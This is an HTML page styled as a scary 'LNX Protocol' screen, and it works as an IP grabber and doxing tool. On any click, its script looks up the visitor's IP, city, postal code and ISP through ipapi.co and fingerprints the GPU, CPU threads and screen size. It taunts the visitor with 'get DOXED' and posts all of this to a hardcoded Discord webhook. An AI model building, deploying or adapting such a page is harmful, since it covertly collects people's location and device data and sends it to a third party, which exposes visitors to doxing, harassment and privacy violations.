<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>LNX | Protocol 4592</title>
    <style>
        body { 
            background: #000 url('https://i.redd.it/jxrd0n9xcgxa1.png') no-repeat center fixed;
            background-size: cover; color: #ff0000; font-family: 'Consolas', monospace; 
            margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh;
            overflow: hidden;
        }
        .flash-red { animation: bg-flash 0.2s infinite; }
        @keyframes bg-flash {
            0% { background-color: rgba(255, 0, 0, 0.7); }
            50% { background-color: rgba(0, 0, 0, 1); }
            100% { background-color: rgba(255, 0, 0, 0.7); }
        }
        .container {
            background: rgba(0, 0, 0, 0.95); border: 2px solid #ff0000;
            padding: 30px; width: 90%; max-width: 550px; box-shadow: 0 0 60px #ff0000; text-align: center;
        }
        h1 { font-size: 4em; text-shadow: 0 0 20px red; margin: 0; letter-spacing: 15px; }
        .teeth-img { width: 70%; margin: 15px 0; filter: drop-shadow(0 0 10px red); }
        .data-box { background: #080808; border: 1px solid #330000; padding: 15px; margin: 10px 0; text-align: left; }
        .data-line { font-size: 0.8em; margin: 4px 0; border-bottom: 1px solid #220000; display: flex; justify-content: space-between; }
        .label { color: #ff0000; font-weight: bold; }
        .value { color: #fff; }
        #dox-msg { display: none; color: #fff; font-size: 1.8em; font-weight: 900; margin-top: 15px; animation: shake 0.1s infinite; }
        @keyframes shake { 0% { transform: translate(3px, 0); } 50% { transform: translate(-3px, 0); } 100% { transform: translate(3px, 0); } }
    </style>
</head>
<body onclick="executeProtocol()">

<div class="container" id="main-ui">
    <h1>LNX</h1>
    <img src="https://i.imgur.com/r6I6UvC.png" class="teeth-img" alt="Protocol Icon">
    
    <div class="data-box" id="results">
        <div class="data-line"><span class="label">FULL REAL IP:</span> <span class="value" id="ip">WAITING...</span></div>
        <div class="data-line"><span class="label">FULL LOCATION:</span> <span class="value" id="location">SCANNING...</span></div>
        <div class="data-line"><span class="label">ISP:</span> <span class="value" id="isp">SCANNING...</span></div>
        <div class="data-line"><span class="label">GPU VENDOR:</span> <span class="value" id="gpu">SCANNING...</span></div>
        <div class="data-line"><span class="label">CPU THREADS:</span> <span class="value" id="cpu">SCANNING...</span></div>
    </div>

    <div id="dox-msg">HAHHAHAHA get DOXED :(</div>
    <div style="font-size: 0.5em; color: #333; margin-top: 15px; cursor: pointer;" onclick="openAdmin()">LNX SYSTEM v22 | ACCESS CODE 4592</div>
</div>

<audio id="protocol-audio" loop>
    <source src="http://googleusercontent.com/file_content/23" type="audio/mpeg">
</audio>

<script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1467137149873819710/oDpNM0_05l4BLYpA6yri4jQ_mB14fvJF5wkOOsMozD4KNM17kBXFmb189GWvxr2-r_kb";
    const ADMIN_KEY = "4592";
    let isExecuting = false;

    function getHardwareInfo() {
        let gpu = "Unknown";
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        } catch(e) {}
        return {
            gpu: gpu,
            threads: navigator.hardwareConcurrency || "N/A",
            res: `${window.screen.width}x${window.screen.height}`
        };
    }

    async function executeProtocol() {
        if(isExecuting) return;
        isExecuting = true;

        // Start the Boiled One Audio
        document.getElementById('protocol-audio').play();

        // Fetch Location Data
        fetch('https://ipapi.co/json/')
            .then(res => res.json())
            .then(data => {
                const hardware = getHardwareInfo();
                const fullLocation = `${data.city}, ${data.region}, ${data.postal}, ${data.country_name}`;
                
                // Display on Screen
                document.getElementById('ip').innerText = data.ip;
                document.getElementById('location').innerText = fullLocation;
                document.getElementById('isp').innerText = data.org;
                document.getElementById('gpu').innerText = hardware.gpu.split(' ').pop();
                document.getElementById('cpu').innerText = hardware.threads;

                // Visual Effects
                document.getElementById('dox-msg').style.display = 'block';
                document.body.classList.add('flash-red');

                // Send to Discord Webhook
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        embeds: [{
                            title: "🎯 LNX DATA CAPTURE COMPLETE",
                            color: 16711680,
                            fields: [
                                { name: "REAL IP", value: data.ip, inline: true },
                                { name: "ISP", value: data.org, inline: true },
                                { name: "FULL LOCATION", value: fullLocation },
                                { name: "GPU VENDOR", value: hardware.gpu },
                                { name: "CPU THREADS", value: hardware.threads.toString(), inline: true },
                                { name: "RESOLUTION", value: hardware.res, inline: true }
                            ],
                            footer: { text: "HAHHAHAHA get DOXED :(" }
                        }]
                    })
                });
            });
    }

    function openAdmin() {
        const pass = prompt("ENTER ACCESS CODE:");
        if(pass === ADMIN_KEY) {
            alert("ACCESS GRANTED. LOGS SYNCED TO WEBHOOK.");
        } else {
            alert("DENIED.");
        }
    }
</script>
</body>
</html>
